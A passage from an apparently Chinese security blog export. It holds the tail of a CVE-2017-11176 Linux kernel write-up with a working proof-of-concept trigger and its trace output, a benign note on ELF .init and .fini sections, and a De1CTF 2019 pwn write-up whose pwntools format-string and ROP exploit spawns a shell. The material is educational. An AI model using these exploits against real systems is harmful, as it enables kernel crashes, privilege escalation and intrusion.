.msg_name = &amp;addr, .msg_namelen = sizeof(addr), .msg_iov = &amp;iov, .msg_iovlen = 1, .msg_control = NULL, .msg_controllen = 0, .msg_flags = 0, &#125;; printf("[ ] preparing blocking netlink socket\n"); if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; 0 || (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; 0) &#123; perror("socket"); goto fail; &#125; printf("[+] socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd); // simulate netlink_autobind() while (_bind(recv_fd, (struct sockaddr*)&amp;addr, sizeof(addr))) &#123; if (errno != EADDRINUSE) &#123; perror("[-] bind"); goto fail; &#125; addr.nl_pid++; &#125; printf("[+] netlink socket bound (nl_pid=%d)\n", addr.nl_pid); if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &amp;new_size, sizeof(new_size))) perror("[-] setsockopt"); // no worry if it fails, it is just an optim. else printf("[+] receive buffer reduced\n"); printf("[ ] flooding socket\n"); while (_sendmsg(send_fd, &amp;mhdr, MSG_DONTWAIT) &gt; 0) // &lt;----- don't forget MSG_DONTWAIT ; if (errno != EAGAIN) // &lt;----- did we failed because the receive buffer is full ? &#123; perror("[-] sendmsg"); goto fail; &#125; printf("[+] flood completed\n"); _close(send_fd); printf("[+] blocking socket ready\n"); return recv_fd;fail: printf("[-] failed to prepare block socket\n"); return -1;&#125; 让我们来看一下System Tap的返回结果。从这里开始，System Tap仅用来观察内核且不修改任何数据。输出结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199sunichi@debian:/mnt/hgfs/Ubuntu For Debug/cve$ ./exploit[ ] -=&#123; CVE-2017-11176 Exploit &#125;=-[ ] preparing blocking netlink socket[+] socket created (send_fd = 3, recv_fd = 4)[+] netlink socket bound (nl_pid=118)[+] receive buffer reduced[ ] flooding socket[+] flood completed[+] blocking socket ready[+] netlink socket created = 4[+] netlink fd duplicated (unblock_fd=3, sock_fd2=5)[ ] creating unblock thread...[+] unblocking thread has been created![ ] get ready to block(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7200)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8300)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c746d40)(1370-1370) &gt;&gt;&gt; kfree (objp=0x0)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c980500)(1370-1370) &gt;&gt;&gt; fget (fd=0x3)(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da100(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; fget (fd=0x3)(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da800(1370-1370) &gt;&gt;&gt; fget (fd=0x3)(1370-1370) &lt;&lt;&lt; fget = ffff88003e3da800(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; fget (fd=0x3)(1370-1370) &lt;&lt;&lt; fget = ffff880020c1e800(1370-1370) &gt;&gt;&gt; fget (fd=0x3)(1370-1370) &lt;&lt;&lt; fget = ffff880020c1e800(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e600(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e600(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=0x3)(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e700(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96cb00 len=0x2800)(1370-1370) &lt;&lt;&lt; skb_put = ffffc9000821f000(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96cb00 timeo=0xffff88003d8cfbd8 ssk=0xffff880037218800)(1370-1370) &lt;&lt;&lt; netlink_attachskb = 0(1370-1370) &gt;&gt;&gt; __fdget (fd=0x3)(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e700(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x2800)(1370-1370) &lt;&lt;&lt; skb_put = ffffc90008223000(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cfbd8 ssk=0xffff880037218800)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8ca0)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c884340)(1370-1370) &lt;&lt;&lt; netlink_attachskb = fffffffffffffff5(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; kfree (objp=0x0)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff880037218800)(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1371) &gt;&gt;&gt; copy_from_user()(1370-1371) &gt;&gt;&gt; copy_from_user()(1370-1371) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffff6932f0)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; alloc_skb (priority=? size=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x20)(1370-1370) &lt;&lt;&lt; skb_put = ffff88003c8b7400(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e601(1370-1370) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880020c1e600)(1370-1370) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880037218000(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cff08 ssk=0x0)[unblock] closing 4 fd[unblock] unblocking now[+] mq_notify succeed[ ] creating unblock thread...[+] unblocking thread has been created![ ] get ready to block(1370-1371) &gt;&gt;&gt; __fdget (fd=?)(1370-1371) &gt;&gt;&gt; copy_from_user()(1370-1371) &gt;&gt;&gt; __fdget (fd=?)(1370-1371) &gt;&gt;&gt; copy_from_user()(1370-1371) &gt;&gt;&gt; __fdget (fd=0x3)(1370-1371) &lt;&lt;&lt; __fdget = ffff880020c1e601(1370-1370) &lt;&lt;&lt; netlink_attachskb = 1(1370-1370) &gt;&gt;&gt; __fdget (fd=0x4)(1370-1370) &lt;&lt;&lt; __fdget = 0(1370-1370) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880037218000 skb=0xffff88003d96c500)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)(1370-1370) &lt;&lt;&lt; netlink_detachskb-=&#123; dump_netlink_sock: 0xffff880037218000 &#125;=-- sk = 0xffff880037218000- sk-&gt;sk_rmem_alloc = 10816- sk-&gt;sk_rcvbuf = 2304- sk-&gt;sk_refcnt = 1- nlk-&gt;state = 0- sk-&gt;sk_flags = 100- SOCK_DEAD = 0-=&#123; dump_netlink_sock: END&#125;=-(1370-1370) &lt;&lt;&lt; mq_notify = fffffffffffffff7(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1372) &gt;&gt;&gt; copy_from_user()(1370-1372) &gt;&gt;&gt; copy_from_user()(1370-1372) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; mq_notify (4294967295, 0x7fffff6932f0)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; alloc_skb (priority=? size=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; skb_put (skb=0xffff88003d96c500 len=0x20)(1370-1370) &lt;&lt;&lt; skb_put = ffff88003c8b7400(1370-1370) &gt;&gt;&gt; __fdget (fd=0x5)(1370-1370) &lt;&lt;&lt; __fdget = ffff880020c1e601(1370-1370) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880020c1e600)(1370-1370) &lt;&lt;&lt; netlink_getsockbyfilp = ffff880037218000(1370-1370) &gt;&gt;&gt; netlink_attachskb (sk=0xffff880037218000 skb=0xffff88003d96c500 timeo=0xffff88003d8cff08 ssk=0x0)[unblock] closing 5 fd[unblock] unblocking now[+] mq_notify succeed[ ] ready to crash?[ ] press key to continue...(1370-1372) &gt;&gt;&gt; __fdget (fd=?)(1370-1372) &gt;&gt;&gt; copy_from_user()(1370-1372) &gt;&gt;&gt; __fdget (fd=?)(1370-1372) &gt;&gt;&gt; copy_from_user()(1370-1372) &gt;&gt;&gt; __fdget (fd=0x3)(1370-1372) &lt;&lt;&lt; __fdget = ffff880020c1e601(1370-1370) &lt;&lt;&lt; netlink_attachskb = 1(1370-1370) &gt;&gt;&gt; __fdget (fd=0x5)(1370-1370) &lt;&lt;&lt; __fdget = 0(1370-1370) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880037218000 skb=0xffff88003d96c500)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c8b7400)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c5d8c40)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff88003c884dc0)(1370-1370) &gt;&gt;&gt; kfree (objp=0xffff880037218000)(1370-1370) &lt;&lt;&lt; netlink_detachskb-=&#123; dump_netlink_sock: 0xffff880037218000 &#125;=-- sk = 0xffff880037218000- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 2304- sk-&gt;sk_refcnt = 0- nlk-&gt;state = 0- sk-&gt;sk_flags = 100- SOCK_DEAD = 0-=&#123; dump_netlink_sock: END&#125;=-(1370-1370) &lt;&lt;&lt; mq_notify = fffffffffffffff7(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?)(1370-1370) &gt;&gt;&gt; copy_from_user()(1370-1370) &gt;&gt;&gt; __fdget (fd=?) Final Proof-Of-Concept Code在最后三节中，我们仅使用用户态代码实现触发该错误所需的所有条件。在最终的proof-of-concept之前，还需要做一件事。 在尝试填充接收缓冲区时，我们发现由于netlink_insert()，在netlink_bind()期间，refcounter加一。 这意味着在进入mq_notify()之前，refcounter被设置为2（而不是1）。 由于该错误使netlink_sock refcounter减少了1，因此我们需要两次触发该错误。 在触发错误之前，我们使用了dup()来解除阻塞主线程的方法。我们将需要再次使用它（因为旧的已关闭），因此我们可以保留一个fd来unblock，而保留另一个fd来触发该错误。 最终的PoC，不需要运行System Tap： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258/* * CVE-2017-11176 Proof-of-concept code by LEXFO. * * Compile with: * * gcc -fpic -O0 -std=c99 -Wall -pthread exploit.c -o exploit */#define _GNU_SOURCE#include &lt;asm/types.h&gt;#include &lt;mqueue.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;stdbool.h&gt;// ============================================================================// ----------------------------------------------------------------------------// ============================================================================#define NOTIFY_COOKIE_LEN (32)#define SOL_NETLINK (270) // from [include/linux/socket.h]// ----------------------------------------------------------------------------// avoid library wrappers#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)#define _setsockopt(sockfd, level, optname, optval, optlen) \ syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)#define _getsockopt(sockfd, level, optname, optval, optlen) \ syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)#define _dup(oldfd) syscall(__NR_dup, oldfd)#define _close(fd) syscall(__NR_close, fd)#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)// ----------------------------------------------------------------------------#define PRESS_KEY() \ do &#123; printf("[ ] press key to continue...\n"); getchar(); &#125; while(0)// ============================================================================// ----------------------------------------------------------------------------// ============================================================================struct unblock_thread_arg&#123; int sock_fd; int unblock_fd; bool is_ready; // we can use pthread barrier instead&#125;;// ----------------------------------------------------------------------------static void* unblock_thread(void *arg)&#123; struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg; int val = 3535; // need to be different than zero // notify the main thread that the unblock thread has been created. It *must* // directly call mq_notify(). uta-&gt;is_ready = true; sleep(5); // gives some time for the main thread to block printf("[ ][unblock] closing %d fd\n", uta-&gt;sock_fd); _close(uta-&gt;sock_fd); printf("[ ][unblock] unblocking now\n"); if (_setsockopt(uta-&gt;unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, sizeof(val))) perror("[+] setsockopt"); return NULL;&#125;// ----------------------------------------------------------------------------static int decrease_sock_refcounter(int sock_fd, int unblock_fd)&#123; pthread_t tid; struct sigevent sigev; struct unblock_thread_arg uta; char sival_buffer[NOTIFY_COOKIE_LEN]; // initialize the unblock thread arguments uta.sock_fd = sock_fd; uta.unblock_fd = unblock_fd; uta.is_ready = false; // initialize the sigevent structure memset(&amp;sigev, 0, sizeof(sigev)); sigev.sigev_notify = SIGEV_THREAD; sigev.sigev_value.sival_ptr = sival_buffer; sigev.sigev_signo = uta.sock_fd; printf("[ ] creating unblock thread...\n"); if ((errno = pthread_create(&amp;tid, NULL, unblock_thread, &amp;uta)) != 0) &#123; perror("[-] pthread_create"); goto fail; &#125; while (uta.is_ready == false) // spinlock until thread is created ; printf("[+] unblocking thread has been created!\n"); printf("[ ] get ready to block\n"); if ((_mq_notify((mqd_t)-1, &amp;sigev) != -1) || (errno != EBADF)) &#123; perror("[-] mq_notify"); goto fail; &#125; printf("[+] mq_notify succeed\n"); return 0;fail: return -1;&#125;// ============================================================================// ----------------------------------------------------------------------------// ============================================================================/* * Creates a netlink socket and fills its receive buffer. * * Returns the socket file descriptor or -1 on error. */static int prepare_blocking_socket(void)&#123; int send_fd; int recv_fd; char buf[1024*10]; int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF struct sockaddr_nl addr = &#123; .nl_family = AF_NETLINK, .nl_pad = 0, .nl_pid = 118, // must different than zero .nl_groups = 0 // no groups &#125;; struct iovec iov = &#123; .iov_base = buf, .iov_len = sizeof(buf) &#125;; struct msghdr mhdr = &#123; .msg_name = &amp;addr, .msg_namelen = sizeof(addr), .msg_iov = &amp;iov, .msg_iovlen = 1, .msg_control = NULL, .msg_controllen = 0, .msg_flags = 0, &#125;; printf("[ ] preparing blocking netlink socket\n"); if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; 0 || (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) &lt; 0) &#123; perror("socket"); goto fail; &#125; printf("[+] socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd); while (_bind(recv_fd, (struct sockaddr*)&amp;addr, sizeof(addr))) &#123; if (errno != EADDRINUSE) &#123; perror("[-] bind"); goto fail; &#125; addr.nl_pid++; &#125; printf("[+] netlink socket bound (nl_pid=%d)\n", addr.nl_pid); if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &amp;new_size, sizeof(new_size))) perror("[-] setsockopt"); // no worry if it fails, it is just an optim. else printf("[+] receive buffer reduced\n"); printf("[ ] flooding socket\n"); while (_sendmsg(send_fd, &amp;mhdr, MSG_DONTWAIT) &gt; 0) ; if (errno != EAGAIN) &#123; perror("[-] sendmsg"); goto fail; &#125; printf("[+] flood completed\n"); _close(send_fd); printf("[+] blocking socket ready\n"); return recv_fd;fail: printf("[-] failed to prepare block socket\n"); return -1;&#125;// ============================================================================// ----------------------------------------------------------------------------// ============================================================================int main(void)&#123; int sock_fd = -1; int sock_fd2 = -1; int unblock_fd = 1; printf("[ ] -=&#123; CVE-2017-11176 Exploit &#125;=-\n"); if ((sock_fd = prepare_blocking_socket()) &lt; 0) goto fail; printf("[+] netlink socket created = %d\n", sock_fd); if (((unblock_fd = _dup(sock_fd)) &lt; 0) || ((sock_fd2 = _dup(sock_fd)) &lt; 0)) &#123; perror("[-] dup"); goto fail; &#125; printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2); // trigger the bug twice if (decrease_sock_refcounter(sock_fd, unblock_fd) || decrease_sock_refcounter(sock_fd2, unblock_fd)) &#123; goto fail; &#125; printf("[ ] ready to crash?\n"); PRESS_KEY(); // TODO: exploit return 0;fail: printf("[-] exploit failed!\n"); PRESS_KEY(); return -1;&#125;// ============================================================================// ----------------------------------------------------------------------------// ============================================================================ 实际测试时，该PoC并不能稳定触发所使用的虚拟机Kernel Panic，需要多次运行exploit。]]></content>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
        <tag>vul</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[.init and .fini]]></title>
    <url>%2F2019%2F09%2F29%2Felf-init-fini-note%2F</url>
    <content type="text"><![CDATA[基于Oracle关于Solaris的文档对程序初始化和终止部分进行学习。 初始化和终止步骤初始化在运行时链接器（runtime linker）将控制权交给一个应用之前，它会对程序和其它已经加载的依赖的初始化段进行处理。初始化段包括 .preinit_array、 .init_array和 .init，它们在构建动态对象（dynamic object）时由链接编辑器（link-editor）创建。 运行时链接器将会执行地址保存在.preinit_array 和 .init_array段中的函数。这些函数会按照在数组中的顺序依次被执行。运行时链接器将.init段作为一个单独的函数来执行。如果一个动态对象同时拥有.init_array和 .init段，.init段会被优先处理。 动态对象可能会在.preinit_array段中提供预初始化函数。这些函数会在动态连接器完成进程映像（process image）建立和重定位后、其它任何初始化函数执行之前进行调用。共享对象中不允许使用预初始化函数。 任何在动态可执行文件中的.init都是由编译器驱动程序（compiler driver）提供的进程启动机制从应用程序本身调用的。在执行所有依赖的初始化部分后，动态可执行文件中的.init段将被调用。 终止动态对象同样可以提供终止段，包括 .fini_array 和 .fini ，它们由链接编辑器在构建动态对象时创建。任何终止段会被例如atexit记录。当进程调用exit或者dlclose从正在运行的进程中删除对象时，将会调用这些例程（routine）。 运行时链接器执行这些地址包含在 .fini_array 中的函数，这些函数的执行顺序与它们出现在数组中的顺序相反。运行时链接器将.fini作为单个函数执行。如果同时包含 .fini 和 .fini_array ，则优先处理.fini_array。 任何在动态可执行文件中的.fini都是由编译器驱动程序（compiler driver）提供的进程终止机制从应用程序本身调用的。在执行所有依赖的终止部分后，动态可执行文件中的.fini段将被调用。 初始化和终止顺序确定运行时在进程内执行初始化和终止代码的顺序是涉及依赖性分析的复杂问题。这个技术发展至今，试图满足现代编程语言和编程技术的期望，但仍存在一些令用户难以满足的情况。理解和限制初始化和终止代码的内容可以提供灵活和可预测的程序运行时行为。 在Solaris 2.6发行版之前，依赖初始化过程以反向加载顺序调用，这与使用ldd显示的依赖项顺序相反。类似的，依赖终止顺序以加载顺序相同。但是，随着依赖层次结构变得更为复杂，这种简单的排序方法变得不合时宜。 从Solaris 2.6开始，运行时链接器构造已加载对象的拓扑列表，这个列表根据每个对象的依赖关系以及依赖关系之外的任何符号绑定所构建。初始化部分以依赖性的反向拓扑顺序执行，如果找到循环依赖关系，则不能对形成循环的对象进行拓扑排序。任何循环依赖的初始化部分以其反向加载顺序执行。类似的，终止过程以依赖关系的拓扑顺序执行，循环依赖关系以其加载顺序执行。 使用ldd与- i选项可以显示对象依赖项的初始化顺序。例如以下动态可执行文件及其依赖表现出循环依赖关系： 12345678910111213141516171819202122232425$ dump -Lv B.so.1 | grep NEEDED[1] NEEDED C.so.1$ dump -Lv C.so.1 | grep NEEDED[1] NEEDED B.so.1$ dump -Lv main | grep NEEDED[1] NEEDED A.so.1[2] NEEDED B.so.1[3] NEEDED libc.so.1$ ldd -i main A.so.1 =&gt; ./A.so.1 B.so.1 =&gt; ./B.so.1 libc.so.1 =&gt; /usr/lib/libc.so.1 C.so.1 =&gt; ./C.so.1 libdl.so.1 =&gt; /usr/lib/libdl.so.1 cyclic dependencies detected, group[1]: ./libC.so.1 ./libB.so.1 init object=/usr/lib/libc.so.1 init object=./A.so.1 init object=./C.so.1 - cyclic group [1], referenced by: ./B.so.1 init object=./B.so.1 - cyclic group [1], referenced by: ./C.so.1 对于使用dlopen添加到正在运行的进程的任何对象，将重复初始化处理。对于调用dlclose，会对从进程卸载的任何对象执行终止处理。 符号绑定作为依赖分析的一部分进行，因为存在许多不能准确表达其依赖关系的共享对象，因此，合并符号绑定有助于产生更准确的依赖关系。但是向不表达所有依赖关系的对象添加符号绑定信息仍可能不足以确定对象的完全依赖关系。最常见的加载对象模型使用延迟绑定。使用此模型，在初始化处理之前仅处理直接引用符号绑定，来自延迟引用的符号绑定可能处于未决状态，并且可能扩展到目前为止建立的依赖关系。 由于对象的依赖性分析可能不完整，并且经常存在循环依赖，因此运行时链接器还提供动态初始化。此初始化尝试在调用同一对象中的任何函数之前执行初始化部分。在延迟符号绑定期间，运行时链接器确定是否已调用绑定的对象的初始化部分，如果不是则在符号绑定过程返回之前调用它们。 使用ldd无法显示动态初始化，但是，通过设置LD_DEBUG可以在运行时观察到确切的初始化调用序列。动态初始化尽在处理延迟引用时可用，使用LD_BIND_NOW、-z now构建对象或dlopen使用模式RTLD_NOW引用的对象可以绕过任何动态初始化。 示例1234567891011121314151617181920212223$ cat main.c#include &lt;stdio.h&gt;void foo() &#123; (void) printf("initializing: foo()\n");&#125;void bar() &#123; (void) printf("finalizing: bar()\n");&#125;main() &#123; (void) printf("main()\n"); return (0);&#125;$ cc -o main -zinitarray=foo -zfiniarray=bar main.c$ maininitializing: foo()main()finalizing: bar() 原文：https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html 示例：https://docs.oracle.com/cd/E19253-01/819-7050/chapter2-48195/index.html]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[De1CTF 2019 pwn writeup]]></title>
    <url>%2F2019%2F08%2F08%2Fde1ctf19-pwn%2F</url>
    <content type="text"><![CDATA[De1CTF的unprintable和Mimic Note。 unprintable比赛的时候愣是没调出来，看了大佬们的做法，有一种做法和之前的某个题类似，就是劫持exit()执行时的控制流。在程序退出的时候，会调用fini_array上的函数，相关地址通过计算得到且计算过程中的一个参数在栈上有地址指向，因此可以通过格式化字符串修改该参数，使得执行exit()时跳回main()函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *DEBUG = 1elf = ELF('./unprintable')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']if DEBUG == 1: while 1: p = process('./unprintable') p.recvuntil('This is your gift: ') recv = p.recvuntil('\n', drop=True) stack_addr = int(recv, 16) target_addr = stack_addr - 312 + 0x18 print hex(stack_addr) print hex(target_addr) if (target_addr &amp; 0xffff &gt; 0x1000 or (target_addr &amp; 0xffff) - (0x601060 - 0x600dd8) &lt; 0x10): p.close() else: breakelse: passif DEBUG == 1: gdb.attach(p)offset_stack = (0x7fff14d283b0 - 0x7fff14d28310) / 8 + 6offset_ret = (0x7fff9de105e8 - 0x7fff9de105c0) / 8 + 6offset_buf = 0x601060 - 0x600dd8target_ret = target_addr &amp; 0xffffpayload = '%' + str(offset_buf + 0x17) + 'x%' + str(offset_stack) + '$hn'payload += '%' + str(target_ret - offset_buf - 0x17) + 'x%' + str(offset_ret) + '$hn'payload += p64(0x4007a3)if len(payload) - 8 != 0x17: payload = '%' + str(offset_buf + 0x16) + 'x%' + str(offset_stack) + '$hn' payload += '%' + str(target_ret - offset_buf - 0x16) + 'x%' + str(offset_ret) + '$hn' payload += p64(0x4007a3) p.send(payload)sleep(1)offset_ret = (0x7ffc94990a40 - 0x7ffc949909b8) / 8 + 6offset_rsp = (0x7fff5a400bc0 - 0x7fff5a400b78) / 8 + 6target_addr += 0x8if target_addr &amp; 0xffff &lt; 0x7a3: payload = '%' + str(target_addr &amp; 0xffff) + 'x%' + str(offset_rsp) + '$hn' payload += '%' + str(0x7a3 - (target_addr &amp; 0xffff)) + 'x%' + str(offset_ret) + '$hn' + '\x00'else: payload = '%' + str(0x7a3) + 'x%' + str(offset_ret) + '$hn' payload += '%' + str((target_addr &amp; 0xffff) - 0x7a3) + 'x%' + str(offset_rsp) + '$hn' + '\x00' raw_input()p.send(payload)sleep(1)# change pop rsp value 0x1060 / retpayload = '%' + str(0x7a3) + 'x%' + str(offset_ret) + '$hn'payload += '%' + str(0x1200 - 0x7a3) + 'x%41$hn' + '\x00' p.send(payload)sleep(1)if ((target_addr &amp; 0xffff) + 2) &lt; 0x7a3: payload = '%' + str((target_addr &amp; 0xffff) + 2) + 'x%15$hn' payload += '%' + str(0x7a3 - ((target_addr &amp; 0xffff) + 2)) + 'x%23$hn' + '\x00'else: payload = '%' + str(0x7a3) + 'x%23$hn' payload += '%' + str(((target_addr &amp; 0xffff) + 2) - 0x7a3) + 'x%15$hn' + '\x00' p.send(payload)sleep(1)payload = '%' + str(0x60) + 'x%41$n'payload += '%' + str(0x7a3 - 0x60) + 'x%23$hn' + '\x00' p.send(payload)sleep(1)payload = '%' + str(0x82d) + 'x%23$hn' + '\x00' pop_rdi_ret = 0x400833payload = payload.ljust(0x601218-0x601060-8, '\x00') + '/bin/sh\x00'payload += p64(0x40082a) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0x800) + p64(0x601800) + p64(0) + p64(0x400810)payload += p64(0) * 7payload += p64(0x400833) + p64(0x601060) + p64(elf.plt['puts'])payload += p64(0x40082d) + p64(0x601800 - 8 * 3)p.send(payload)sleep(1)payload = p64(0x40082a) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0x1) + p64(0x601218) + p64(0) + p64(0x400810)payload += p64(0) * 7payload += p64(0x40082a) + p64(0) + p64(1) + p64(elf.got['read']) + p64(59) + p64(0x601060) + p64(0) + p64(0x400810)payload += p64(0) * 7payload += p64(0x40082a) + p64(0) + p64(1) + p64(0x601218) + p64(0) + p64(0) + p64(0x601210) + p64(0x400810)payload += p64(0) * 7p.send(payload)sleep(1)p.send('\xac')p.send('\x00' * 59)p.sendline('/bin/sh 1&gt;&amp;2')p.interactive()p.close()'''0x000000000040082c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040082e : pop r13 ; pop r14 ; pop r15 ; 